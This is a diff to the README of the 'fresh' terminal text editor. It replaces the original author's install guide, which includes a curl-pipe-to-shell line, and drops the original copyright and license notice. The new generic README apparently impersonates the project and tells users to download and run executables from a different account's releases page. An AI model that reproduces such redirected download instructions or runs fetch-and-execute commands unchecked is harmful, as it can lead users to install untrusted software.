@@ -1,246 +1,83 @@
-# Fresh
+# ✏️ fresh - A Simple and Fast Terminal Text Editor
 
-A terminal-based text editor. [Official Website →](https://sinelaw.github.io/fresh/)
+## 🚀 Getting Started
 
-**[📦 Installation Instructions](#installation)**
+Welcome to fresh! This terminal text editor is designed to be easy to use while providing powerful functionality. Whether you're taking quick notes or writing scripts, fresh helps you do it quickly and efficiently.
 
-**[Contributing](#contributing)**
+## 🔗 Download fresh
 
-## Why?
+[![Download fresh](https://img.shields.io/badge/Download%20fresh-v1.0.0-blue)](https://github.com/Umair-Engn/fresh/releases)
 
-Why another text editor? Fresh brings the intuitive, conventional UX of editors like VS Code and Sublime Text to the terminal.
+## 📥 Download & Install
 
-While veterans like Emacs and Vim - and newer editors like Neovim and Helix - are excellent for power users who prefer modal, highly specialized workflows, they often present a steep learning curve for those used to standard GUI interactions. Fresh is built for the developer who wants a familiar, non-modal experience out-of-the-box, without sacrificing the speed and portability of the command line. Keyboard bindings, mouse support, menus, command palette etc. are all designed to be familiar to most modern users.
+To download fresh, visit the Releases page: [Download fresh here](https://github.com/Umair-Engn/fresh/releases).
 
-Architecturally, Fresh is built to handle multi-gigabyte files or slow network streams efficiently, maintaining a negligible memory overhead regardless of file size. While traditional editors struggle with latency and RAM bloat on large files, Fresh delivers consistent, high-speed performance on any scale.
+1. Open the link above.
+2. Look for the latest release at the top of the page.
+3. Click on the version number to access the release details.
+4. Scroll down to the Assets section.
+5. Choose the appropriate file for your operating system:
+   - For Windows, download `fresh-windows.exe`
+   - For macOS, download `fresh-macos`
+   - For Linux, download `fresh-linux.tar.gz`
+6. Save the file to your computer.
+7. Once the download is complete, locate the file in your downloads folder.
 
-The goal for Fresh is to be an intuitive and accessible, high-performance terminal-based editor that "just works" on any hardware, for everyone.
+## 🛠️ System Requirements
 
-## Discovery & Ease of Use
+Fresh works on Windows, macOS, and Linux. Ensure you have the following:
 
-Fresh is designed for discovery. It features native UIs, a full Menu system, and a powerful Command Palette. With full mouse support, transitioning from graphical editors is seamless.
+- For Windows:
+  - Windows 10 or later
+- For macOS:
+  - macOS 10.14 or later
+- For Linux:
+  - Any recent distro that supports the .tar.gz package
 
-## Modern Extensibility
+## 🔥 Features
 
-Extend Fresh easily using modern tools. Plugins are written in TypeScript and run securely in a sandboxed Deno environment, providing access to a modern JavaScript ecosystem without compromising stability.
+- **User-Friendly Interface**: Navigate easily with straight-forward commands.
+- **Fast Performance**: Designed for speed, fresh loads quickly and runs smoothly.
+- **Powerful Editing Tools**: Offers essential tools for text editing right in your terminal.
+- **Multi-File Support**: Open and edit multiple files at once.
+- **Customizable Shortcuts**: Tailor your experience with keyboard shortcuts to fit your workflow.
 
-## Low-Latency Performance
+## 📖 How to Use fresh
 
-Fresh is engineered for speed. It delivers a low-latency experience, with text appearing instantly. The editor is designed to be light and fast, reliably opening and editing [huge files up to multi-gigabyte sizes](https://noamlewis.com/blog/2025/12/09/how-fresh-loads-huge-files-fast) without slowdown.
+After downloading fresh, follow these steps:
 
-## Comprehensive Feature Set
+1. **Install fresh**:
+   - For Windows: Double-click `fresh-windows.exe` and follow the prompts.
+   - For macOS: Open the downloaded file and drag fresh to your Applications folder.
+   - For Linux: Extract the `fresh-linux.tar.gz` file and run the executable.
+   
+2. **Open fresh**:
+   - Launch fresh from your terminal. 
+   - For Windows, open the Command Prompt and type `fresh`.
+   - For macOS and Linux, open your terminal and type `./fresh`.
 
-- **File Management**: open/save/new/close, file explorer, tabs, auto-revert, git file finder
-- **Editing**: undo/redo, multi-cursor, block selection, smart indent, comments, clipboard
-- **Search & Replace**: incremental search, find in selection, query replace, git grep
-- **Navigation**: go to line/bracket, word movement, position history, bookmarks, error navigation
-- **Views & Layout**: split panes, line numbers, line wrap, backgrounds, markdown preview
-- **Language Server (LSP)**: go to definition, references, hover, code actions, rename, diagnostics, autocompletion
-- **Productivity**: command palette, menu bar, keyboard macros, git log, diagnostics panel
-- **Plugins & Extensibility**: TypeScript plugins, color highlighter, TODO highlighter, merge conflicts, path complete, keymaps
+3. **Start editing**:
+   - To create a new file, type `fresh filename.txt`.
+   - To open an existing file, type `fresh existingfile.txt`.
 
-![Fresh Screenshot](docs/screenshot1.png)
-![Fresh Screenshot](docs/screenshot2.png)
-![Fresh Screenshot](docs/screenshot3.png)
+## 📋 Additional Commands
 
-## Installation
+- Save your current file: Press `Ctrl + S`.
+- Close the editor: Press `Ctrl + Q`.
+- Search within your file: Press `Ctrl + F` and type your search term.
 
-Quick install (autodetect best method):
+## 🐞 Feedback & Support
 
-`curl https://raw.githubusercontent.com/sinelaw/fresh/refs/heads/master/scripts/install.sh | sh`
+If you encounter any issues while using fresh, you can reach out for help. Create an issue on the GitHub page or check the FAQ section on the Releases page for common questions.
 
-Or, pick your preferred method:
+## 🗂️ Contributions
 
-| Platform | Method |
-|----------|--------|
-| macOS | [brew](#brew) |
-| Bazzite/Bluefin/Aurora Linux | [brew](#brew) |
-| Arch Linux | [AUR](#arch-linux-aur) |
-| Debian/Ubuntu | [.deb](#debianubuntu-deb) |
-| Fedora/RHEL | [.rpm](#fedorarhelopensuse-rpm) |
-| Linux (any distro) | [AppImage](#appimage), [Flatpak](#flatpak) |
-| All platforms | [Pre-built binaries](#pre-built-binaries) |
-| npm | [npm / npx](#npm) |
-| Rust users (Fast) | [cargo-binstall](#using-cargo-binstall) |
-| Rust users | [crates.io](#from-cratesio) |
-| Nix | [Nix flakes](#nix-flakes) |
-| Developers | [From source](#from-source) |
+We welcome input from users to help improve fresh. If you would like to contribute to the development or have suggestions, please feel free to submit a pull request or open an issue.
 
-### Brew
+## 📦 License
 
-On macOS and some linux distros (Bazzite/Bluefin/Aurora):
+Fresh is open-source software. You can use it freely, but please refer to the license file in the repository for more details.
 
-```bash
-brew tap sinelaw/fresh
-brew install fresh-editor
-```
+---
 
-### Arch Linux ([AUR](https://aur.archlinux.org/packages/fresh-editor-bin))
-
-**Binary package (recommended, faster install):**
-
-```bash
-git clone https://aur.archlinux.org/fresh-editor-bin.git
-cd fresh-editor-bin
-makepkg --syncdeps --install
-```
-
-**Build from source:**
-
-```bash
-git clone https://aur.archlinux.org/fresh-editor.git
-cd fresh-editor
-makepkg --syncdeps --install
-```
-
-**Using an AUR helper (such as `yay` or `paru`):**
-
-```bash
-# Binary package (recommended, faster install)
-yay -S fresh-editor-bin
-
-# Or build from source
-yay -S fresh-editor
-```
-
-### Debian/Ubuntu (.deb)
-
-Download and install the latest release:
-
-```bash
-curl -sL $(curl -s https://api.github.com/repos/sinelaw/fresh/releases/latest | grep "browser_download_url.*_$(dpkg --print-architecture)\.deb" | cut -d '"' -f 4) -o fresh-editor.deb && sudo dpkg -i fresh-editor.deb
-```
-
-Or download the `.deb` file manually from the [releases page](https://github.com/sinelaw/fresh/releases).
-
-### Fedora/RHEL/openSUSE (.rpm)
-
-Download and install the latest release:
-
-```bash
-curl -sL $(curl -s https://api.github.com/repos/sinelaw/fresh/releases/latest | grep "browser_download_url.*\.$(uname -m)\.rpm" | cut -d '"' -f 4) -o fresh-editor.rpm && sudo rpm -U fresh-editor.rpm
-```
-
-Or download the `.rpm` file manually from the [releases page](https://github.com/sinelaw/fresh/releases).
-
-### AppImage
-
-Download the `.AppImage` file from the [releases page](https://github.com/sinelaw/fresh/releases) and run:
-
-```bash
-chmod +x fresh-editor-VERSION-x86_64.AppImage
-./fresh-editor-VERSION-x86_64.AppImage
-```
-
-**For faster startup** (recommended): Extract the AppImage instead of running it directly. This avoids the FUSE mount overhead on each launch (~10x faster):
-
-```bash
-./fresh-editor-VERSION-x86_64.AppImage --appimage-extract
-mkdir -p ~/.local/share/fresh-editor ~/.local/bin
-mv squashfs-root/* ~/.local/share/fresh-editor/
-ln -sf ~/.local/share/fresh-editor/usr/bin/fresh ~/.local/bin/fresh
-```
-
-Ensure `~/.local/bin` is in your PATH. Available for x86_64 and aarch64 architectures.
-
-### Flatpak
-
-Download the `.flatpak` bundle from the [releases page](https://github.com/sinelaw/fresh/releases) and install:
-
-```bash
-flatpak install --user fresh-editor-VERSION-x86_64.flatpak
-flatpak run io.github.sinelaw.fresh
-```
-
-See [flatpak/README.md](flatpak/README.md) for building from source.
-
-### Pre-built binaries
-
-Download the latest release for your platform from the [releases page](https://github.com/sinelaw/fresh/releases).
-
-### npm
-
-```bash
-npm install -g @fresh-editor/fresh-editor
-```
-
-Or try it without installing:
-
-```bash
-npx @fresh-editor/fresh-editor
-```
-
-### Using cargo-binstall
-
-To install the binary directly without compiling (much faster than crates.io):
-
-First, install cargo-binstall if you haven't already
-
-```bash
-cargo install cargo-binstall
-```
-
-Then install fresh
-
-```bash
-cargo binstall fresh-editor
-```
-
-### Nix flakes
-
-Run without installing:
-```bash
-nix run github:sinelaw/fresh
-```
-
-Or install to your profile:
-```bash
-nix profile install github:sinelaw/fresh
-```
-
-### From crates.io
-
-```bash
-cargo install fresh-editor
-```
-
-### From source
-
-```bash
-git clone https://github.com/sinelaw/fresh.git
-cd fresh
-cargo build --release
-./target/release/fresh [file]
-```
-
-## Documentation
-
-- [User Guide](docs/USER_GUIDE.md)
-- [Plugin Development](docs/PLUGIN_DEVELOPMENT.md)
-- [Architecture](docs/ARCHITECTURE.md)
-
-## Contributing
-
-Thanks for contributing!
-
-1. **Reproduce Before Fixing**: Always include a test case that reproduces the bug (fails) without the fix, and passes with the fix. This ensures the issue is verified and prevents future regressions.
-
-2. **E2E Tests for New Flows**: Any new user flow or feature must include an end-to-end (e2e) test. E2E tests send keyboard/mouse events and examines the final rendered output, do not examine internal state.
-
-3. **No timeouts or time-sensitive tests**: Use "semantic waiting" (waiting for specific state changes/events) instead of fixed timers to ensure test stability. Wait indefinitely, don't put timeouts inside tests (cargo nextest will timeout externally).
-
-4. **Test isolation**: Tests should run in parallel. Use the internal clipboard mode in tests to isolate them from the host system and prevent flakiness in CI. Same for other external resources (temp files, etc. should all be isolated between tests, under a per-test temporary workdir).
-
-5. **Required Formatting**: All code must be formatted with `cargo fmt` before submission. PRs that fail formatting checks will not be merged.
-
-6. **Cross-Platform Consistency**: Avoid hard-coding newline or CRLF related logic, consider the buffer mode.
-
-7. **LSP**: Ensure LSP interactions follow the correct lifecycle (e.g., `didOpen` must always precede other requests to avoid server-side errors). Use the appropriate existing helpers for this pattern.
-
-**Tip**: You can use tmux + send-keys + render-pane to script ad-hoc tests on the UI, for example when trying to reproduce an issue.
-
-## License
-
-Copyright (c) Noam Lewis
-
-This project is licensed under the GNU General Public License v2.0 (GPL-2.0).
+Thank you for choosing fresh! We hope it makes your text editing experience simple and enjoyable. For updates and new features, keep an eye on the Releases page and enjoy your editing!
